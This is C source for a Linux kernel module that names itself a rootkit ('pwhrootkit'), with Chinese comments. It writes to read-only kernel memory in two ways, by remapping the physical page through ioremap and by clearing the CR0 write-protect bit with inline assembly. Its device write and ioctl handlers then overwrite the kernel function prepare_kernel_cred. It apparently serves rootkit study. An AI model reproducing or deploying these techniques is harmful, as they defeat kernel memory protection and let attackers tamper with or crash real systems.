#include "pwhrootkit.h"
#include <linux/uaccess.h>
#include <linux/init_task.h>
#include <linux/kstrtox.h>
#include <linux/sched.h>
#include <linux/pid.h>

struct kernel_args{
    void * content;
    int size;
};


static int arbitrary_remap_write(void *dst, void *src, size_t size){
    size_t phys_addr, phys_offset;
    size_t phys_ioremap_addr;
    /* 获取虚拟地址所在物理页帧的首地址 */
    phys_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
    /* 获取页内地址的偏移 */
    phys_offset = (size_t )dst & 0xfff;
    /* 重新映射该物理地址到另一个虚拟地址 */
    phys_ioremap_addr = (size_t)ioremap(phys_addr, PAGE_SIZE);
    /* 拷贝内容到该虚拟地址,从而间接拷贝到只读物理地址 */
    memcpy((size_t *)(phys_ioremap_addr + phys_offset), src, size);
    /* 最后调用该函数来解除映射 */
    iounmap((size_t *)phys_ioremap_addr);
    return 0;
}

static size_t asm_read_cr0(void){
    size_t cr0;
    asm volatile(
        "movq %%cr0, %%rax;"
        "movq %%rax, %0;"
            :"=r"(cr0):: "%rax"
    );
    return cr0;
}

static void asm_write_cr0(size_t cr0){
    asm volatile(
        "movq %0, %%rax;"
        "movq %%rax, %%cr0;"
            :: "r"(cr0): "%rax"
    );
}


static void asm_disable_wp(void){
    size_t cr0;
    cr0 = asm_read_cr0();
    /* 如果设置了wp,则禁止 */
    if((cr0 >> 16) & 1){
        cr0 &= (~(1 << 16));
        asm_write_cr0(cr0);
    }
}

/*
static void asm_enable_wp(void){
    size_t cr0;
    cr0 = asm_read_cr0();

    if(!((cr0 >> 16) & 1)){
        cr0 |= (1 << 16);
        printk(KERN_INFO "[peiwithhao rootkit]set cr0:%lx", cr0);
        //asm_write_cr0(cr0);
    }
}
*/

static void arbitrary_cr0_write(void *dst, void *src, size_t count){
    size_t orig_cr0;
    orig_cr0 = asm_read_cr0();
    asm_disable_wp();
    memcpy(dst, src, count);
    /* 如果以前设置了WP, 将其开启 */
    asm_write_cr0(orig_cr0);
}


static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
    return 0;
}
static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    arbitrary_remap_write(prepare_kernel_cred, "peiwithhao", 10);
    return 0;
}
static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    arbitrary_cr0_write(prepare_kernel_cred, "peiwithhao", 10);
    return 0;
}
/* 打开类容 */
static int pwh_rootkit_open(struct inode *inode, struct file *file){
    return 0;
}
static int pwh_rootkit_release(struct inode *inode, struct file *file){
    return 0;
}
